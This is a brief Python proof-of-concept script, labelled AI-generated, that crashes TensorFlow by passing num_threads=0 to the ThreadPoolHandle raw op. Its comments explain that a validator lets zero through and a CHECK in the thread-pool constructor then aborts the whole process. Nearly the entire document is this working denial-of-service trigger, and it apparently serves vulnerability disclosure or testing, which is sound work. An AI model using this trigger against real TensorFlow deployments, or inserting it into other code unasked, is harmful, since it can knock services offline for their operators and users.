# AI-generated PoC (black-box). A public op accepts num_threads=0, which its validator
# (ValidateNumThreads: rejects <0 and >=kThreadLimit, but NOT 0) lets through; the ThreadPool
# constructor then hits CHECK_GE(num_threads, 1) and aborts the whole process (DoS).
import os
os.environ["TF_CPP_MIN_LOG_LEVEL"] = "3"
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"
import tensorflow as tf
tf.raw_ops.ThreadPoolHandle(num_threads=0, display_name="poc")
print("NO CRASH")  # unreachable: process aborts above
